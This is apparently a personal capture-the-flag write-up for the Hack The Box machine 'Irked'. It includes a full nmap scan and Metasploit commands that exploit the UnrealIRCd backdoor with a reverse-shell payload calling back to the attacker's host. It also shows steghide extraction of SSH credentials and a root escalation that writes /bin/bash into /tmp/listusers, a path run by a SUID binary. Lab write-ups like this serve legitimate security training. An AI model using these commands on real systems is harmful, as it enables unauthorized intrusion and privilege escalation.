---
cover: ../.gitbook/assets/image (83).png
coverY: 0
---

# HTB-Irked

<figure><img src="../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>

* nmap scan

```
# Nmap 7.94SVN scan initiated Fri May 23 21:41:53 2025 as: nmap -vvv -sC -A -O -osscan-guess -sV --reason -version-all -oN nmap/03-detail-scan.txt -iL target.txt -p22,80,111,6697,8067,37792,65534
Nmap scan report for 10.10.10.117
Host is up, received reset ttl 62 (0.25s latency).
Scanned at 2025-05-23 21:41:53 IST for 37s

PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 62 OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAI+wKAAyWgx/P7Pe78y6/80XVTd6QEv6t5ZIpdzKvS8qbkChLB7LC+/HVuxLshOUtac4oHr/IF9YBytBoaAte87fxF45o3HS9MflMA4511KTeNwc5QuhdHzqXX9ne0ypBAgFKECBUJqJ23Lp2S9KuYEYLzUhSdUEYqiZlcc65NspAAAAFQDwgf5Wh8QRu3zSvOIXTk+5g0eTKQAAAIBQuTzKnX3nNfflt++gnjAJ/dIRXW/KMPTNOSo730gLxMWVeId3geXDkiNCD/zo5XgMIQAWDXS+0t0hlsH1BfrDzeEbGSgYNpXoz42RSHKtx7pYLG/hbUr4836olHrxLkjXCFuYFo9fCDs2/QsAeuhCPgEDjLXItW9ibfFqLxyP2QAAAIAE5MCdrGmT8huPIxPI+bQWeQyKQI/lH32FDZb4xJBPrrqlk9wKWOa1fU2JZM0nrOkdnCPIjLeq9+Db5WyZU2u3rdU8aWLZy8zF9mXZxuW/T3yXAV5whYa4QwqaVaiEzjcgRouex0ev/u+y5vlIf4/SfAsiFQPzYKomDiBtByS9XA==
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDDGASnp9kH4PwWZHx/V3aJjxLzjpiqc2FOyppTFp7/JFKcB9otDhh5kWgSrVDVijdsK95KcsEKC/R+HJ9/P0KPdf4hDvjJXB1H3Th5/83gy/TEJTDJG16zXtyR9lPdBYg4n5hhfFWO1PxM9m41XlEuNgiSYOr+uuEeLxzJb6ccq0VMnSvBd88FGnwpEoH1JYZyyTnnbwtBrXSz1tR5ZocJXU4DmI9pzTNkGFT+Q/K6V/sdF73KmMecatgcprIENgmVSaiKh9mb+4vEfWLIe0yZ97c2EdzF5255BalP3xHFAY0jROiBnUDSDlxyWMIcSymZPuE1N6Tu8nQ/pXxKvUar
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFeZigS1PimiXXJSqDy2KTT4UEEphoLAk8/ftEXUq0ihDOFDrpgT0Y4vYgYPXboLlPBKBc0nVBmKD+6pvSwIEy8=
|   256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC6m+0iYo68rwVQDYDejkVvsvg22D8MN+bNWMUEOWrhj
80/tcp    open  http    syn-ack ttl 62 Apache httpd 2.4.10 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind syn-ack ttl 62 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          37792/tcp   status
|   100024  1          49373/tcp6  status
|   100024  1          53670/udp   status
|_  100024  1          58129/udp6  status
6697/tcp  open  irc     syn-ack ttl 62 UnrealIRCd
8067/tcp  open  irc     syn-ack ttl 62 UnrealIRCd
37792/tcp open  status  syn-ack ttl 62 1 (RPC #100024)
65534/tcp open  irc     syn-ack ttl 62 UnrealIRCd
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.10 - 4.11 (95%), Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.13 or 4.2 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.2 (95%), Linux 4.4 (95%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=5/23%OT=22%CT=%CU=33113%PV=Y%DS=3%DC=T%G=N%TM=68309E6E%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)
OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)
WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
ECN(R=Y%DF=Y%T=40%W=7210%O=M552NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.023 days (since Fri May 23 21:09:13 2025)
Network Distance: 3 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   1.85 ms   192.168.0.59
2   247.07 ms 10.10.14.1
3   249.76 ms 10.10.10.117

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 23 21:42:30 2025 -- 1 IP address (1 host up) scanned in 37.04 seconds

```

```
65534/tcp open  irc     syn-ack ttl 62 UnrealIRCd (Admin email djmardov@irked.htb)
```

* `djmardov@irked.htb` found in nmap scan
* was not sure about UnrealIRCd so googled it
  * https://www.rapid7.com/db/modules/exploit/unix/irc/unreal\_ircd\_3281\_backdoor/
* nmap had a way to verify
  * https://nmap.org/nsedoc/scripts/irc-unrealircd-backdoor.html

```
nmap -d -p 6697,6667,8067,65534 10.10.10.117 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor
```

* got to know it was vulnerable

```
PORT      STATE  SERVICE    REASON
6667/tcp  closed irc        conn-refused
6697/tcp  open   ircs-u     syn-ack
|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277
8067/tcp  open   infi-async syn-ack
|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277
65534/tcp open   unknown    syn-ack
Final times for host: srtt: 258737 rttvar: 89971  to: 618621
```

* use msf

```
msfconsole
```

```
use unix/irc/unreal_ircd_3281_backdoor
```

```
set PAYLOAD cmd/unix/reverse
set RHOSTS   10.10.10.117
set RPORT    6697
set LHOST 10.10.14.8
set LPORT 4444
run
```

* while exploring went to the `Documents`
* it has a `.backup` file
  * when i cat it

```
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

* this secition i did look at the walk rhough cause it did not hit me. this si where the box went from real world to more CTF type
* download the picture from the website port 80

```
steghide extract -p UPupDOWNdownLRlrBAbaSSss -sf irked.jpg
```

* you get

```
Kab6h+m+bbp2J:HG
```

```
ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no djmardov@10.10.10.117
```

* ssh with this password
* after looking around for sometime i looked into the suid binaries

```
find / -type f -perm -4000 2>/dev/null
```

```
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/sbin/exim4
/usr/sbin/pppd
/usr/bin/chsh
/usr/bin/procmail
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/pkexec
/usr/bin/X
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/viewuser
/sbin/mount.nfs
/bin/su
/bin/mount
/bin/fusermount
/bin/ntfs-3g
/bin/umount

```

* from which
  * `/usr/bin/viewuser` stood out
* when i tried to run it i got the following output

```
/usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           May 23 11:34 (:0)
djmardov pts/0        May 23 13:23 (10.10.14.8)
sh: 1: /tmp/listusers: not found
```

* the last line caught my attention
* `sh: 1: /tmp/listusers: not found`
* `echo "ls">/tmp/listusers`

```
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           May 23 11:34 (:0)
djmardov pts/0        May 23 13:23 (10.10.14.8)
root@irked:~# ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos  user.txt
```

* now tried for a shell

```
echo '/bin/bash' > /tmp/listusers
```

```
djmardov@irked:~$ /usr/bin/viewuser 
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           May 23 11:34 (:0)
djmardov pts/0        May 23 13:23 (10.10.14.8)
root@irked:~# ls
```

## References

* [nfs-isnt-just-file-sharing-its-rpc-in-disguise.md](../blog/nfs-isnt-just-file-sharing-its-rpc-in-disguise.md "mention")
